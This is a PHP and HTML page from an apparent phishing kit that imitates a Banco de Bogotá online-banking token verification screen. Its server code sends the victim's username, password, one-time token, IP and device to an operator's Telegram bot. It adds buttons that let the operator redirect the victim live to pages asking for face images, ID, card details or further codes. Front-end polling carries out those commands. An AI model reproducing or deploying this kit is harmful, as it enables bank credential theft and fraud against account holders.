<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------

session_start();

// ─── CONFIG ──────────────────────────────────────────────────────────────────
$configLocal = require __DIR__ . '/config.php';
$config = $configLocal;
if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $globalPath = __DIR__ . '/../config.php';
    if (file_exists($globalPath)) {
        $config = require $globalPath;
    }
}

$logFile = __DIR__ . '/../log_pse.txt';
$log = function($msg) use ($logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " | [b-34f4-consulta2] $msg\n", FILE_APPEND | LOCK_EX);
};

// ─── RECIBIR TOKEN ────────────────────────────────────────────────────────────
$token = trim($_POST['u_tk'] ?? '');

$tokenType = trim($_POST['u_type'] ?? $_SESSION['token_type'] ?? '6');
$tokenType = in_array($tokenType, ['6', '8']) ? $tokenType : '6';
$_SESSION['token_type'] = $tokenType;

if (empty($token)) {
    header('Location: codigo.php?type=' . $tokenType);
    exit;
}

// ─── RECUPERAR DATOS DE SESIÓN ────────────────────────────────────────────────
$transactionId = $_SESSION['session_id'] ?? ('session_' . time() . '_' . bin2hex(random_bytes(5)));
$usuario       = $_SESSION['usuario']    ?? '';
$pass          = $_SESSION['pass']       ?? '';
$tbdatos       = $_SESSION['tbdatos']    ?? [];
if (!is_array($tbdatos)) $tbdatos = [];

if (empty($_SESSION['session_id'])) {
    $_SESSION['session_id'] = $transactionId;
}

// ─── DETECCIÓN DE DISPOSITIVO E IP ───────────────────────────────────────────
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device    = 'PC';
if (stripos($userAgent, 'Android') !== false)                                             $device = 'Android';
elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) $device = 'iPhone';
elseif (stripos($userAgent, 'Mobile') !== false)                                          $device = 'Movil';

$ip   = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$hora = date('d/m/Y H:i:s');

// ─── CONSTRUIR MENSAJE (mismo formato: bullets 🟢, sin emojis sueltos) ────────
$bancoRaw = !empty($tbdatos['banco']) ? $tbdatos['banco'] : '1001 - BANCO DE BOGOTA';
$banco = function_exists('jelpi_format_banco') ? jelpi_format_banco($bancoRaw, 'b-10') : strtoupper($bancoRaw);

$msg  = "◉ TOKEN - {$banco} ◉\n\n";

if (!empty($tbdatos['nombre'])) {
    $msg .= "🟢 Nombre: " . htmlspecialchars($tbdatos['nombre']) . "\n";
}

$monto = $tbdatos['total_pagar'] ?? $tbdatos['monto'] ?? $tbdatos['amount'] ?? $tbdatos['valor'] ?? $tbdatos['valor_pagar'] ?? $tbdatos['total'] ?? '';
if ($monto === '') {
    $monto = $_SESSION['monto'] ?? $_SESSION['total_pagar'] ?? '';
}
if ($monto !== '') {
    $msg .= "🟢 Monto: $" . number_format((float)$monto, 0, ',', '.') . "\n";
}

$msg .= "\n";
$msg .= "🟢 Usuario: " . htmlspecialchars($usuario) . "\n";
$msg .= "🟢 Clave: " . htmlspecialchars($pass) . "\n";
$msg .= "🟢 Token: " . htmlspecialchars($token) . "\n\n";
$msg .= "🟢 IP: {$ip} | Device: {$device} | {$hora}\n\n";
$msg .= "🐙 @FU7UR4MA 🐙";

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Cara',       'callback_data' => "error:{$transactionId}"],
            ['text' => 'Cedula',     'callback_data' => "cedula:{$transactionId}"]
        ],
        [
            ['text' => 'Tarjeta',    'callback_data' => "error_tc:{$transactionId}"],
            ['text' => 'sms',        'callback_data' => "token_6:{$transactionId}"],
            ['text' => 'token',      'callback_data' => "token_8:{$transactionId}"]
        ],
        [
            ['text' => 'Error Logo', 'callback_data' => "error_logo:{$transactionId}"],
            ['text' => 'Finalizar',  'callback_data' => "confirm_finalizar:{$transactionId}"]
        ],
        [
            ['text' => 'Bre-B',      'callback_data' => "bre_b:{$transactionId}"]
        ]
    ,
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]]
];

// ─── ENVIAR A TELEGRAM ────────────────────────────────────────────────────────
$messageId  = null;

if (!empty($config['bot_token']) && !empty($config['chat_id'])) {
    $data = [
        'chat_id'      => $config['chat_id'],
        'text'         => $msg,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);

    $response  = curl_exec($ch);
    $curlError = curl_error($ch);
    curl_close($ch);

    if (!$curlError) {
        $result = json_decode($response, true);
        if (!empty($result['ok'])) {
            $messageId = $result['result']['message_id'];
            $log("OK Token enviado. MessageId: $messageId | Txn: $transactionId");
        } else {
            $log("ERROR Telegram: " . ($result['description'] ?? 'sin descripcion'));
        }
    } else {
        $log("CURL ERROR: $curlError");
    }
} else {
    $log("ADVERTENCIA: config vacio, sin envio a Telegram");
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación Banca Virtual</title>
    <link rel="icon" type="image/x-icon" href="https://virtual.bancodebogota.co/bbog-pb-frontend-bv-shell/assets/favicon.ico">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
        body { background-color: #F8FAFB; min-height: 100vh; display: flex; flex-direction: column; }

        .header { background: #FFFFFF; height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; border-bottom: 1px solid #EAECEF; }
        .nav-btn { display: flex; align-items: center; gap: 8px; color: #00448D; font-size: 14px; font-weight: 500; cursor: pointer; background: none; border: none; }
        .nav-btn svg { width: 18px; height: 18px; stroke: #00448D; stroke-width: 2; fill: none; }
        .header-title { font-size: 16px; font-weight: 600; color: #000; }

        .main-container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 60px 20px 20px; }
        .page-title { font-size: 24px; font-weight: 600; color: #000; margin-bottom: 25px; text-align: center; }

        .verify-card { background: #FFFFFF; border: 1px solid #E6E9ED; border-radius: 12px; width: 556px; max-width: 100%; padding: 40px 48px; box-shadow: 0 2px 8px rgba(0,0,0,0.01); display: flex; flex-direction: column; }
        .card-title { font-size: 20px; font-weight: 600; color: #000; margin-bottom: 10px; }
        .instructions { font-size: 15px; color: #555; line-height: 1.45; margin-bottom: 28px; }

        .token-inputs { display: flex; justify-content: flex-start; gap: 12px; margin-bottom: 30px; }
        .token-box { width: 48px; height: 48px; border: 1px solid #D1D5DB; border-radius: 8px; text-align: center; font-size: 20px; font-weight: 600; color: #000; outline: none; transition: border-color 0.2s; }
        .token-box:focus { border-color: #00448D; box-shadow: 0 0 0 1px #00448D; }

        /* Loader overlay */
        #loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(13, 35, 72, 0.75);
            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 9999; text-align: center; padding: 20px;
        }
        .loader-scene { position: relative; width: 120px; height: 120px; margin-bottom: 30px; display: flex; justify-content: center; align-items: center; }
        .dots-wrapper { position: relative; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; animation: global-rotate 1.8s linear infinite 2.5s; }
        .dot { position: absolute; width: 28px; height: 28px; border-radius: 50%; transform: scale(0); }
        .cyan   { background-color: #00e5ff; z-index: 3; }
        .yellow { background-color: #ffeb3b; z-index: 2; }
        .red    { background-color: #ff3d00; z-index: 1; }
        .fixed-shadow { position: absolute; bottom: -5px; width: 40px; height: 8px; background: rgba(0,0,0,0.5); border-radius: 50%; filter: blur(5px); transform: scale(0); }
        .loader-text { color: white; font-size: 19px; font-weight: 500; max-width: 320px; text-shadow: 0 2px 8px rgba(0,0,0,0.6); }

        @keyframes global-rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes intro-cyan   { 0% { transform: scale(0) translateY(-80px); } 20%, 100% { transform: scale(1) translate(0,0); } }
        @keyframes intro-yellow { 0%, 65% { transform: scale(0); } 100% { transform: scale(1) translate(0,0); } }
        @keyframes intro-red    { 0%, 85% { transform: scale(0); } 100% { transform: scale(1) translate(0,0); } }
        @keyframes move-cyan    { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(0,-40px); } }
        @keyframes move-yellow  { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(-35px,20px); } }
        @keyframes move-red     { 0%, 100% { transform: translate(0,0); } 50% { transform: translate(35px,20px); } }
        @keyframes shadow-pulse { 0%, 20% { transform: scale(0); opacity: 0; } 100% { transform: scale(1.1); opacity: 1; } }

        @media (max-width: 768px) {
            .verify-card { border: none; background: transparent; padding: 0; box-shadow: none; }
            .token-inputs { justify-content: space-between; gap: 8px; margin-bottom: 35px; }
            .token-box { flex: 1; height: 56px; font-size: 22px; }
        }
    </style>
</head>
<body onload="runLoader()">

    <div id="loader-overlay">
        <div class="loader-scene">
            <div class="dots-wrapper">
                <div class="dot cyan"></div>
                <div class="dot yellow"></div>
                <div class="dot red"></div>
            </div>
            <div class="fixed-shadow"></div>
        </div>
        <p class="loader-text">Verificando tu código token, por favor espera.</p>
    </div>

    <header class="header">
        <button class="nav-btn">
            <svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round"/></svg>
            Atrás
        </button>
        <div class="header-title">Ingreso a Banca Virtual</div>
        <button class="nav-btn">
            Abandonar
            <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
    </header>

    <main class="main-container">
        <h1 class="page-title">Verifiquemos que seas tú</h1>
        <div class="verify-card">
            <h2 class="card-title">Código Token</h2>
            <p class="instructions">Para realizar este proceso, ingresa el código de Token móvil o físico.</p>
            <div class="token-inputs">
                <?php
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
 foreach (str_split($token) as $digit): ?>
                <input type="tel" class="token-box" value="<?= htmlspecialchars($digit) ?>" readonly>
                <?php
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
 endforeach; ?>
            </div>
        </div>
    </main>

    <script>
        const transactionId = <?= json_encode($transactionId) ?>;
        const messageId     = <?= json_encode($messageId) ?>;
        let pollTimer = null;
        let pollInFlight = false;

        function clearPolling() {
            if (pollTimer) {
                clearTimeout(pollTimer);
                pollTimer = null;
            }
        }

        window.addEventListener('beforeunload', clearPolling);

        function runLoader() {
            document.querySelector('.cyan').style.animation   = "intro-cyan 2.5s ease-out forwards, move-cyan 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
            document.querySelector('.yellow').style.animation = "intro-yellow 2.5s ease-out forwards, move-yellow 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
            document.querySelector('.red').style.animation    = "intro-red 2.5s ease-out forwards, move-red 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
            document.querySelector('.fixed-shadow').style.animation = "shadow-pulse 2.5s ease-out forwards";

            if (messageId) {
                clearPolling();
                pollTimer = setTimeout(() => comenzarPolling(), 2500);
            }
        }

        async function comenzarPolling() {
            if (pollInFlight) {
                return;
            }
            pollInFlight = true;

            try {
                const formData = new FormData();
                formData.append('transactionId', transactionId);
                formData.append('messageId', messageId);

                const res    = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
                const result = await res.json();

                if (result && result.action) {
                    clearPolling();
                    switch (result.action) {
                        case 'token_6':
                            window.location.href = 'codigo.php?type=6&error=1';
                            break;
                        case 'token_8':
                            window.location.href = 'codigo.php?type=8&error=1';
                            break;
                        case 'bre_b':
                            window.location.href = '/recaudos/brev.php?bogota';
                            break;
                        case 'error_logo':
                            window.location.href = 'index.html?error=1';
                            break;
                        case 'error_tc':
                            window.location.href = '/datac/alter.php';
                            break;
                        case 'error':
                            window.location.href = '/caras';
                            break;
                        case 'cedula':
                            window.location.href = '/cedula';
                            break;
                        case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                            window.location.href = '/fin.php';
                            break;
                        default:
                            pollTimer = setTimeout(() => comenzarPolling(), 2000);
                    }
                } else {
                    pollTimer = setTimeout(() => comenzarPolling(), 2000);
                }
            } catch (err) {
                pollTimer = setTimeout(() => comenzarPolling(), 2000);
            } finally {
                pollInFlight = false;
            }
        }
    </script>
</body>
</html>
